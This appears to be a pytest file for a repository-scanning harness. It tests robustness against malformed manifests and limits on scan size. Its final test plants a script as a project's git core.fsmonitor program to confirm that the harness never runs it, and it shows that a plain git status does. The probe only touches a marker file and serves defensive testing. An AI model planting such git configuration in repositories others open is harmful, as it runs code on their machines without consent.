# -- checks_fs 10: manifests are project input, and nothing about them is assumed --------

@pytest.mark.parametrize("name,text", [
    ("package.json", "[]"), ("package.json", '"text"'), ("package.json", "null"),
    ("package.json", '{"dependencies": null}'), ("package.json", '{"devDependencies": [], "dependencies": 3}'),
    ("package.json", '{"scripts": {"test": 1}, "dependencies": {"react": "18"}}'),
    ("package.json", "[" * 100_000), ("package.json", b"\xff\xfe\x00"),
    ("pyproject.toml", 'project = "x"'), ("pyproject.toml", "project = [1, 2]"),
    ("pyproject.toml", "[project]\nname = 3\n"), ("pyproject.toml", b"\xff\xfe"),
    ("prisma/schema.prisma", b"\xff\xfe\x00"), ("alembic.ini", b"\xff"),
    ("quadratus/registry.py", b"\xff\xfe"),
])
def test_a_manifest_of_any_shape_never_stops_the_run(tmp_path, name, text):
    _write(tmp_path, {name: text, "pyproject.toml" if name == "quadratus/registry.py" else "x.txt":
                      '[project]\nname = "quadratus"\n'})
    found = detect_adapters(tmp_path)
    assert isinstance(found, dict)
    assert load_policy(tmp_path).resolve(["a.py"])["primary_family"] == "pure-logic"


def test_well_formed_manifests_are_still_read(tmp_path):
    _write(tmp_path, {"package.json": json.dumps({"dependencies": {"react": "18", "zod": "3"},
                                                  "scripts": {"test": "node --test"}}),
                      "prisma/schema.prisma": "model A {}\n"})
    found = detect_adapters(tmp_path)
    assert found["ui_lib"]["value"] == "react" and found["validation_lib"]["value"] == "zod"
    assert found["tool"]["value"] == "prisma" and found["test_runner"]["value"] == ["npm", "test", "--silent"]


# -- checks_fs 18: the bounded scan is bounded ---------------------------------------------------

def test_line_counting_keeps_its_meaning_and_its_bounds(tmp_path, monkeypatch):
    cases = {"empty": b"", "one": b"a", "two": b"a\nb", "two-terminated": b"a\nb\n", "blank": b"\n\n\n"}
    for name, data in cases.items():
        (tmp_path / name).write_bytes(data)
    assert {name: _count_lines(tmp_path / name) for name in cases} == {
        "empty": 0, "one": 1, "two": 2, "two-terminated": 2, "blank": 3}
    assert _count_lines(tmp_path / "missing") == 0
    monkeypatch.setattr(repo_scan, "_MAX_LINES_COUNTED", 5)
    (tmp_path / "many").write_bytes(b"\n" * 100_000)
    assert _count_lines(tmp_path / "many") == 5


def test_line_counting_reads_no_more_than_its_byte_bound(tmp_path, monkeypatch):
    monkeypatch.setattr(repo_scan, "_MAX_COUNT_BYTES", 4096)
    monkeypatch.setattr(repo_scan, "_CHUNK", 1024)
    path = tmp_path / "one-huge-line"
    path.write_bytes(b"x" * 1_000_000)
    sizes = []

    class Counting:
        def __init__(self, handle):
            self.handle = handle

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            self.handle.close()

        def read(self, size=-1):
            data = self.handle.read(size)
            sizes.append(len(data))
            return data

    real_open = Path.open
    monkeypatch.setattr(Path, "open", lambda self, *a, **k: Counting(real_open(self, *a, **k)))
    assert _count_lines(path) == 1
    assert sum(sizes) == 4096 and max(sizes) == 1024


def test_the_readme_head_is_read_with_a_byte_cap(tmp_path):
    (tmp_path / "README.md").write_text("# Title\n" + "word " * 200_000)
    head = scan_repo(tmp_path).readme_head
    assert head.startswith("# Title") and len(head.encode()) <= repo_scan._README_BYTES
    (tmp_path / "README.md").write_text("\n".join(f"line {i}" for i in range(40)))
    assert scan_repo(tmp_path).readme_head.splitlines() == [f"line {i}" for i in range(12)]


def test_directory_entries_count_against_the_scan_budget(tmp_path, monkeypatch):
    for i in range(60):
        (tmp_path / f"d{i:02d}" / "inner" / "leaf").mkdir(parents=True)
    listed = []
    real_scandir = os.scandir

    class Counting:
        def __init__(self, listing):
            self.listing = listing

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            self.listing.close()

        def __iter__(self):
            for entry in self.listing:
                listed.append(entry.name)
                yield entry

    monkeypatch.setattr(repo_scan.os, "scandir", lambda path: Counting(real_scandir(path)))
    monkeypatch.setattr(repo_scan, "_MAX_ENTRIES", 25)
    report = scan_repo(tmp_path)
    assert report.file_count == 0 and len(listed) <= 26, "the walk stops at the entry budget"
    assert len(report.top_dirs) <= 25
    listed.clear()
    monkeypatch.setattr(repo_scan, "_MAX_ENTRIES", 10_000)
    assert len(scan_repo(tmp_path).top_dirs) == 60 and len(listed) == 180


def test_the_scan_still_names_what_it_named(tmp_path):
    _write(tmp_path, {"src/app.py": "a\nb\nc\n", "src/util.py": "a\n", "tests/test_app.py": "x\n",
                      "pyproject.toml": "", "README.md": "# App\n", ".hidden/x.py": "x\n",
                      "node_modules/p/i.js": "x\n"})
    (tmp_path / "linked").symlink_to(tmp_path / "src")
    report = scan_repo(tmp_path)
    assert report.top_dirs == ["linked", "src", "tests"]
    assert report.principal_files == [("src/app.py", 3), ("src/util.py", 1)]
    assert report.languages == {"Python": 3} and report.test_dirs == ["tests/"]
    assert report.manifests == ["pyproject.toml"] and report.readme_head == "# App"


# -- the project's own git configuration does not choose a program the harness runs -----

@needs_git
def test_git_status_does_not_run_a_program_named_in_the_projects_git_config(tmp_path):
    root = tmp_path / "project"
    root.mkdir()
    subprocess.run(["git", "init", "--quiet"], cwd=root, check=True)
    marker = tmp_path / "FSMONITOR-RAN"
    hook = tmp_path / "hook.sh"
    hook.write_text(f"#!/bin/sh\ntouch {marker}\n")
    hook.chmod(0o755)
    _write(root, {"a.txt": "1\n"})
    subprocess.run(["git", "config", "core.fsmonitor", str(hook)], cwd=root, check=True)
    assert "a.txt" in Project(root).git_status()
    assert not marker.exists()
    subprocess.run(["git", "status", "--short"], cwd=root, check=True, capture_output=True)
    assert marker.exists(), "the probe is real: a plain status does run it"
